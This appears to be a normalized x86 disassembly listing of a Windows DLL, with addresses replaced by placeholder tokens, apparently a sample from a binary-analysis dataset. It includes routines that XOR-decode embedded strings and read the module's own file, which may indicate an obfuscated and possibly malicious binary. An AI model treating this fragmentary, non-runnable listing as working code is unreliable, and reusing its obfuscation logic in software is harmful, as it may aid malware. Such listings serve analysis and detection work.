mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10002a60
mov edx [ esi ]
mov eax [ edx + 0x18 ]
mov ecx esi
call eax
mov esi eax
test esi esi
jne r-xdata
mov eax esi
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
mov eax esi
lea edx [ eax + 0x1 ]
lea esp [ esp ]
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax esi
lea ecx [ ebp - 0x2c ]
call sub_10002a60
push esi
call sub_10012e64
add esp 0x4
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x2c ]
push ecx
call sub_10012c4b
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn 0x4
sub_10011540
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push ebx
mov edx eax
push esi
lea esi [ edx + 0x1 ]
lea ecx [ ecx ]
mov bl [ edx ]
inc edx
test bl bl
jne r-xdata
sub edx esi
add ecx 0x4
mov esi edx
call sub_10004db0
pop esi
mov eax 0x1
pop ebx
pop ebp
retn 0x4
sub_10011570
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100115e0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100115a0
push ebp
mov ebp esp
push ecx
push esi
mov esi ecx
mov eax [ esi + 0x24 ]
mov ecx [ esi + 0x20 ]
cmp ecx eax
je r-xdata
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
push ebx
push edi
push edx
push eax
call sub_100119c0
mov edi [ esi + 0x24 ]
mov ebx eax
mov eax [ ebp - 0x4 ]
push eax
mov eax ebx
call sub_10011ac0
add esp 0xc
pop edi
mov [ esi + 0x24 ] ebx
pop ebx
sub_100115e0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov [ esi ] r--data
mov eax [ esi + 0x20 ]
xor ebx ebx
cmp eax ebx
je r-xdata
mov [ esi + 0x20 ] ebx
mov [ esi + 0x24 ] ebx
mov [ esi + 0x28 ] ebx
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx [ ebp - 0x4 ]
push edi
mov edi [ esi + 0x24 ]
push ecx
call sub_10011ac0
mov edx [ esi + 0x20 ]
push edx
call sub_10012c4b
add esp 0x8
pop edi
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] 0xf
mov [ esi + 0x4 ] bl
mov [ esi ] r--data
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x4 ]
push eax
call sub_10012c4b
add esp 0x4
sub_10011650
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
lea eax [ edi + edi + 0x1 ]
push eax
call sub_10012766
add esp 0x4
xor edx edx
test edi edi
je r-xdata
mov [ eax + edi * 2 ] dl
pop edi
pop ebp
retn 0x8
push esi
mov esi [ ebp + 0x8 ]
mov edi edi
cmp cl 0xf
jg r-xdata
add cl 0x30
jmp r-xdata
xor cl cl
add cl 0x57
jmp r-xdata
mov [ eax + edx * 2 ] cl
mov cl [ edx + esi ]
and cl 0xf
cmp cl 0x9
jg r-xdata
cmp cl 0xf
jg r-xdata
add cl 0x30
jmp r-xdata
xor cl cl
add cl 0x57
jmp r-xdata
mov [ eax + edx * 2 + 0x1 ] cl
inc edx
cmp edx edi
jb r-xdata
mov cl [ edx + esi ]
sar cl 0x4
and cl 0xf
cmp cl 0x9
jg r-xdata
pop esi
mov [ eax + edi * 2 ] 0x0
pop edi
pop ebp
retn 0x8
sub_100116d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d79a
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ ebx + 0x4 ]
cmp edi ecx
jae r-xdata
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp eax edi
ja r-xdata
mov esi [ ebx + 0x4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x2
test esi esi
je r-xdata
mov ecx ebx
call sub_100117d0
sub edi eax
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x38
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
call sub_10005ef0
mov [ ebp - 0x4 ] 0x3
mov ecx [ ebx ]
lea eax [ esi * 8 ]
sub eax esi
mov esi [ ebx + 0x4 ]
lea edi [ ecx + eax * 8 ]
mov [ ebp - 0x10 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
cmp esi eax
je r-xdata
mov ecx ebx
call sub_100117d0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
call sub_10005ef0
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
add esi 0x1c
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
add edi 0x1c
mov [ esi ] 0x0
call sub_10005ef0
sub_100117d0
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x5
mov esi edx
shr esi 0x1f
add esi edx
push edi
cmp esi 0x4924923
jbe r-xdata
mov edi [ ecx + 0x8 ]
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x5
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_100126ab
pop edi
pop esi
pop ebx
retn
mov edx eax
shr edx 0x1
mov edi 0x4924924
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_10011850
mov eax esi
cmp eax esi
jae r-xdata
sub_10011850
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d760
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x4924924
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_100126ab
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_10011960
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_10011b20
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax * 8 ]
sub ecx eax
mov eax [ ebp - 0x14 ]
lea edx [ eax + ecx * 8 ]
lea ecx [ ebx * 8 ]
sub ecx ebx
mov [ esi + 0x8 ] edx
lea edx [ eax + ecx * 8 ]
mov [ esi + 0x4 ] edx
mov [ esi ] eax
mov ecx [ ebp + 0x8 ]
mov edi [ esi + 0x4 ]
mov eax [ esi ]
push ecx
call sub_10011ac0
mov edx [ esi ]
push edx
call sub_10012c4b
add esp 0x8
sub_10011960
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x4924924
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10012808
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10013848
lea eax [ ecx * 8 ]
sub eax ecx
add eax eax
add eax eax
add eax eax
push eax
call sub_10012ca7
add esp 0x4
test eax eax
jne r-xdata
sub_100119c0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx ecx
cmp eax [ ebp + 0x8 ]
je r-xdata
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
push esi
push edi
lea edi [ eax + 0x30 ]
sub eax ebx
add eax 0xffffffd0
lea esi [ ebx + 0x30 ]
mov [ ebp - 0x4 ] eax
xor ecx ecx
cmp [ esi - 0x1c ] 0x10
jb r-xdata
mov eax [ ebp - 0x4 ]
add esi 0x38
lea ecx [ eax + esi ]
add ebx 0x38
add edi 0x38
cmp ecx [ ebp + 0x8 ]
jne r-xdata
cmp [ esi ] 0x10
jb r-xdata
mov eax [ ebp - 0x4 ]
xor ecx ecx
mov [ esi - 0x1c ] 0xf
mov [ esi - 0x20 ] ecx
mov [ ebx ] cl
cmp [ edi - 0x1c ] 0x10
jae r-xdata
mov eax [ ebx ]
push eax
call sub_10012c4b
add esp 0x4
add eax esi
cmp ebx eax
je r-xdata
pop edi
pop esi
mov [ esi ] 0xf
mov [ esi - 0x4 ] ecx
lea eax [ esi - 0x14 ]
mov [ eax ] 0x0
cmp [ edi ] 0x10
jae r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_10012c4b
add esp 0x4
xor ecx ecx
mov edx [ eax + esi ]
mov [ ebx ] edx
mov [ eax + esi ] ecx
mov ecx [ edi - 0x20 ]
inc ecx
push ecx
add eax esi
push eax
push ebx
call sub_100128c0
add esp 0xc
xor ecx ecx
jmp r-xdata
mov edx [ edi - 0x14 ]
mov [ eax ] edx
mov [ edi - 0x14 ] ecx
mov ecx [ edi - 0x4 ]
inc ecx
push ecx
lea edx [ edi - 0x14 ]
push edx
push eax
call sub_100128c0
add esp 0xc
xor ecx ecx
jmp r-xdata
lea eax [ esi - 0x14 ]
lea edx [ edi - 0x14 ]
cmp eax edx
je r-xdata
mov eax [ edi - 0x20 ]
mov [ esi - 0x20 ] eax
mov edx [ edi - 0x1c ]
mov [ esi - 0x1c ] edx
mov [ edi - 0x20 ] ecx
mov [ edi - 0x1c ] ecx
jmp r-xdata
mov eax [ edi - 0x4 ]
mov [ esi - 0x4 ] eax
mov edx [ edi ]
mov [ esi ] edx
mov [ edi - 0x4 ] ecx
mov [ edi ] ecx
sub_10011ac0
cmp eax edi
je r-xdata
retn
push ebx
push esi
lea esi [ eax + 0x30 ]
xor ebx ebx
jmp r-xdata
cmp [ esi ] 0x10
jb r-xdata
mov [ esi ] 0xf
mov [ esi - 0x4 ] ebx
mov [ esi - 0x14 ] bl
cmp [ esi - 0x1c ] 0x10
jb r-xdata
mov eax [ esi - 0x14 ]
push eax
call sub_10012c4b
add esp 0x4
mov [ esi - 0x1c ] 0xf
mov [ esi - 0x20 ] ebx
mov [ esi - 0x30 ] bl
add esi 0x38
lea edx [ esi - 0x30 ]
cmp edx edi
jne r-xdata
mov ecx [ esi - 0x30 ]
push ecx
call sub_10012c4b
add esp 0x4
pop esi
pop ebx
sub_10011b20
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d73d
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0xc ]
lea edi [ eax + 0x30 ]
lea esi [ ecx + 0x30 ]
nop
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ecx ecx
cmp eax ecx
je r-xdata
add eax 0x38
add esi 0x38
mov [ ebp + 0xc ] eax
add edi 0x38
jmp r-xdata
mov [ edi - 0x1c ] 0xf
mov [ edi - 0x20 ] ecx
mov [ eax ] cl
cmp eax edx
je r-xdata
lea edx [ esi - 0x30 ]
cmp edx [ ebp + 0x8 ]
je r-xdata
mov [ edi - 0x4 ] ecx
lea ecx [ esi - 0x14 ]
lea edx [ edi - 0x14 ]
lea ebx [ edi - 0x14 ]
mov [ edi ] 0xf
mov [ ebx ] 0x0
cmp edx ecx
je r-xdata
mov ebx 0x10
cmp [ edi - 0x1c ] ebx
jb r-xdata
cmp [ edi ] 0x10
jb r-xdata
mov [ edi - 0x1c ] 0xf
mov [ edi - 0x20 ] ecx
mov [ eax ] 0x0
cmp [ esi - 0x1c ] ebx
jae r-xdata
mov eax [ eax ]
push eax
call sub_10012c4b
mov eax [ ebp + 0xc ]
add esp 0x4
xor ecx ecx
xor ecx ecx
mov [ edi ] 0xf
mov [ edi - 0x4 ] ecx
mov [ ebx ] cl
cmp [ esi ] 0x10
jae r-xdata
mov eax [ ebx ]
push eax
call sub_10012c4b
mov eax [ ebp + 0xc ]
add esp 0x4
mov edx [ esi - 0x30 ]
mov [ eax ] edx
mov [ esi - 0x30 ] ecx
mov ecx [ esi - 0x20 ]
inc ecx
push ecx
lea ecx [ esi - 0x30 ]
push ecx
push eax
call sub_100128c0
mov eax [ ebp + 0xc ]
add esp 0xc
xor ecx ecx
jmp r-xdata
mov edx [ esi - 0x14 ]
mov [ ebx ] edx
mov [ esi - 0x14 ] ecx
mov eax [ esi - 0x4 ]
inc eax
push eax
lea eax [ esi - 0x14 ]
push eax
push ebx
call sub_100128c0
mov eax [ ebp + 0xc ]
add esp 0xc
jmp r-xdata
mov edx [ esi - 0x20 ]
mov [ edi - 0x20 ] edx
mov edx [ esi - 0x1c ]
mov [ edi - 0x1c ] edx
mov [ esi - 0x20 ] ecx
mov [ esi - 0x1c ] ecx
mov ecx [ esi - 0x4 ]
mov [ edi - 0x4 ] ecx
mov edx [ esi ]
mov [ edi ] edx
mov [ esi - 0x4 ] 0x0
mov [ esi ] 0x0
sub_10011c70
push ebp
mov ebp esp
sub esp 0x8
mov edx [ eax * 4 + rw-data ]
lea ecx [ eax * 4 + rw-data ]
mov [ ebp - 0x8 ] ecx
test edx edx
jne r-xdata
mov eax [ ecx ]
mov esp ebp
pop ebp
retn
push ebx
lea ebx [ eax * 4 + rw-data ]
mov eax [ ebx ]
mov cl [ eax ]
push esi
movzx esi [ eax + 0x1 ]
lea edx [ esi + 0x1 ]
push edi
push edx
mov [ ebp - 0x1 ] cl
call sub_10012ca7
add esp 0x4
mov edi eax
xor ecx ecx
mov [ esi + edi ] 0x0
test esi esi
je r-xdata
mov esi [ ebp - 0x8 ]
push edi
push esi
call [ InterlockedExchange@IAT ]
mov eax [ esi ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebx ]
mov dl [ ecx + eax + 0x3 ]
xor dl [ ebp - 0x1 ]
inc ecx
mov [ ecx + edi - 0x1 ] dl
cmp ecx esi
jb r-xdata
sub_10011d10
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10011d40
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10011d40
push esi
mov esi ecx
mov ecx [ esi + 0x8 ]
push edi
xor edi edi
mov [ esi ] r--data
cmp ecx edi
je r-xdata
mov ecx [ esi + 0xc ]
cmp ecx edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x8 ] edi
mov ecx [ esi + 0x10 ]
cmp ecx edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0xc ] edi
mov ecx [ esi + 0x14 ]
cmp ecx edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x10 ] edi
mov ecx [ esi + 0x18 ]
cmp ecx edi
je r-xdata
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x14 ] edi
pop edi
pop esi
retn
mov eax [ ecx ]
mov edx [ eax ]
push 0x1
call edx
mov [ esi + 0x18 ] edi
sub_10011db0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d3b3
mov eax [ fs : 0x0 ]
push eax
sub esp 0x64
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
push 0x14
mov [ ebp - 0x70 ] edi
call sub_10012ca7
xor ebx ebx
add esp 0x4
cmp eax ebx
je r-xdata
xor eax eax
mov [ eax ] r--data
mov [ eax + 0x4 ] ebx
mov [ eax + 0x8 ] ebx
mov [ eax + 0xc ] ebx
mov [ eax + 0x10 ] ebx
jmp r-xdata
xor eax eax
mov [ eax ] r--data
jmp r-xdata
push ebx
mov [ edi + 0x8 ] eax
call sub_10010c50
push 0x4
mov [ edi + 0xc ] eax
call sub_10012ca7
add esp 0x8
cmp eax ebx
je r-xdata
xor esi esi
push 0x4
call sub_10012ca7
add esp 0x4
cmp eax ebx
je r-xdata
mov ecx [ edi + 0x8 ]
mov [ edi + 0x10 ] eax
mov eax [ ecx ]
mov edx [ eax + 0x4 ]
call edx
push 0xc
mov [ ebp - 0x68 ] eax
call sub_10012ca7
mov esi eax
add esp 0x4
mov [ ebp - 0x6c ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
push esi
call sub_10012c4b
mov eax [ ebp - 0x2c ]
add esp 0x4
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x6c ] ebx
cmp [ ebp - 0x18 ] edi
jae r-xdata
mov eax [ ebp - 0x64 ]
push eax
call sub_10012c4b
add esp 0x4
xor eax eax
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x68 ]
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
jmp r-xdata
mov [ eax ] r--data
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x68 ]
mov [ esi ] r--data
mov [ esi + 0x8 ] eax
jmp r-xdata
lea ecx [ ebp - 0x6c ]
push ecx
lea ebx [ ebp - 0x68 ]
call sub_100120f0
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi + 0x14 ] esi
lea esi [ ebp - 0x48 ]
call sub_10012040
mov [ ebp - 0x4 ] 0x1
mov ecx [ edi + 0x8 ]
mov esi [ ecx ]
mov edx [ esi + 0x4 ]
call edx
mov ecx [ edi + 0x8 ]
push eax
mov eax [ esi + 0x10 ]
call eax
push ebx
lea edx [ ebp - 0x48 ]
mov esi eax
xor ecx ecx
push edx
or eax 0xffffffff
lea edi [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
call sub_100106c0
mov ebx 0x1
mov eax edi
mov [ ebp - 0x4 ] 0x2
call sub_10012240
mov edx esi
lea ecx [ ebp - 0x64 ]
call sub_100124d0
xor ebx ebx
push ebx
push eax
or eax 0xffffffff
mov [ ebp - 0x4 ] 0x3
call sub_10012190
mov edi 0x8
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x50 ] edi
jb r-xdata
mov esi [ ebp - 0x70 ]
mov ecx [ esi + 0x14 ]
mov eax [ ebp - 0x6c ]
mov edx [ ecx ]
mov ebx [ ebp - 0x68 ]
mov edx [ edx + 0x4 ]
push eax
push ebx
call edx
push ebx
mov [ esi + 0x18 ] eax
call sub_10012e64
xor ebx ebx
add esp 0x4
cmp [ esi + 0x18 ] ebx
jne r-xdata
cmp [ ebp - 0x18 ] edi
jb r-xdata
cmp [ ebp - 0x18 ] edi
jb r-xdata
cmp [ ebp - 0x18 ] edi
jb r-xdata
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10012c4b
add esp 0x4
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
xor ecx ecx
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] cx
cmp [ ebp - 0x34 ] edi
jb r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_10012c4b
add esp 0x4
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10012c4b
add esp 0x4
mov eax 0x1
mov edx [ ebp - 0x48 ]
push edx
call sub_10012c4b
add esp 0x4
mov edx [ ebp - 0x48 ]
push edx
call sub_10012c4b
add esp 0x4
xor eax eax
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
sub_10012040
push ebp
mov ebp esp
sub esp 0x214
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push 0x20a
lea eax [ ebp - 0x210 ]
push 0x0
push eax
mov [ ebp - 0x214 ] 0x0
call sub_10018220
mov edx [ edi + 0x4 ]
add esp 0xc
push 0x104
lea ecx [ ebp - 0x210 ]
push ecx
push edx
call [ GetModuleFileNameW@IAT ]
lea eax [ ebp - 0x210 ]
push 0x5c
push eax
call sub_100134cf
add esp 0x8
test eax eax
je r-xdata
xor edx edx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
lea eax [ ebp - 0x210 ]
mov [ esi ] dx
lea edx [ eax + 0x2 ]
nop
xor ecx ecx
mov [ eax ] cx
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x210 ]
mov ecx esi
call sub_10010fb0
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax esi
call sub_10012771
mov esp ebp
pop ebp
retn
sub_100120f0
push ebp
mov ebp esp
push ecx
push esi
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x80000000
push eax
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
push 0x0
push esi
call [ GetFileSize@IAT ]
mov edi eax
push edi
call sub_10012766
add esp 0x4
mov [ ebx ] eax
test eax eax
je r-xdata
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
push esi
call [ CloseHandle@IAT ]
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
push 0x0
lea ecx [ ebp - 0x4 ]
push ecx
push edi
push eax
push esi
mov [ ebp - 0x4 ] 0x0
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov eax [ ebx ]
push eax
call sub_10012e64
add esp 0x4
cmp edi [ ebp - 0x4 ]
jne r-xdata
mov edx [ ebp + 0x8 ]
push esi
mov [ edx ] edi
call [ CloseHandle@IAT ]
pop edi
mov eax 0x1
pop esi
mov esp ebp
pop ebp
retn 0x4
sub_10012190
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax ebx
jae r-xdata
push r--data
call sub_100126f8
mov eax [ edi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_100126ab
mov eax edi
pop ebx
pop ebp
retn 0x8
push esi
lea esi [ eax + ebx ]
mov eax edi
call sub_100107f0
test al al
je r-xdata
pop esi
mov ecx [ ebp + 0x8 ]
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
xor ecx ecx
mov [ eax + esi * 2 ] cx
mov eax [ edi ]
xor ecx ecx
mov [ eax + esi * 2 ] cx
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
lea edx [ ebx + ebx ]
push edx
mov edx [ ebp + 0xc ]
lea ecx [ ecx + edx * 2 ]
mov edx [ edi + 0x10 ]
push ecx
lea eax [ eax + edx * 2 ]
push eax
call sub_10018b70
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
sub_10012240
push edi
mov edi eax
mov ecx [ edi + 0x14 ]
cmp ecx 0x8
jb r-xdata
cmp eax r--data
ja r-xdata
mov eax [ edi ]
mov eax [ edi + 0x10 ]
or edx 0xffffffff
sub edx eax
cmp edx ebx
ja r-xdata
cmp ecx 0x8
jb r-xdata
test ebx ebx
je r-xdata
push r--data
call sub_100126ab
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
pop edi
retn
push esi
lea esi [ eax + ebx ]
mov eax edi
call sub_100107f0
test al al
je r-xdata
cmp ecx 0x8
jb r-xdata
mov edx [ edi + 0x10 ]
lea eax [ eax + edx * 2 ]
cmp eax r--data
jbe r-xdata
pop esi
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov ecx r--data
sub ecx eax
sar ecx 0x1
push ecx
push edi
mov eax ebx
call sub_10012190
pop edi
retn
mov eax edi
xor ecx ecx
mov [ eax + esi * 2 ] cx
mov eax [ edi ]
xor ecx ecx
mov [ eax + esi * 2 ] cx
pop esi
mov eax edi
pop edi
retn
mov edx [ edi + 0x10 ]
lea ecx [ ebx + ebx ]
push ecx
lea eax [ eax + edx * 2 ]
push r--data
push eax
call sub_10018b70
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
sub_10012300
push esi
push 0x20
call sub_10012ca7
xor esi esi
add esp 0x4
cmp eax esi
je r-xdata
xor eax eax
mov ecx [ rw-data ]
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] esi
mov [ eax + 0xc ] esi
mov [ eax + 0x10 ] esi
mov [ eax + 0x14 ] esi
mov [ eax + 0x18 ] esi
mov [ eax + 0x1c ] esi
mov [ eax ] r--data
jmp r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
pop esi
jmp eax
cmp ecx esi
je r-xdata
mov edx [ eax ]
mov [ rw-data ] eax
mov ecx eax
mov eax [ edx ]
call eax
mov ecx [ rw-data ]
test eax eax
jne r-xdata
mov [ rw-data ] esi
pop esi
retn
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
push 0x1
call eax
sub_10012370
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10014900
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
mov [ ebp - 0x4 ] 0x0
push 0x8007
call [ SetErrorMode@IAT ]
call sub_10012300
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
xor eax eax
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_10012420
push ebp
mov ebp esp
push 0xfffffffe
push r--data
push sub_10014900
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x8 ] eax
xor eax ebp
push eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x18 ] esp
cmp [ rw-data ] 0x0
je r-xdata
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push 0xffffffff
mov eax [ rw-data ]
push eax
call [ TerminateThread@IAT ]
push 0xffffffff
mov ecx [ rw-data ]
push ecx
call [ WaitForSingleObject@IAT ]
mov edx [ rw-data ]
push edx
call [ CloseHandle@IAT ]
mov [ rw-data ] 0x0
mov [ ebp - 0x4 ] 0x0
mov eax [ ecx ]
mov edx [ eax + 0xc ]
call edx
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_100124d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cb78
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi edx
mov eax edi
mov esi ecx
mov [ ebp - 0x30 ] 0x0
lea edx [ eax + 0x1 ]
jmp r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
xor ecx ecx
inc eax
mov edx 0x2
mul edx
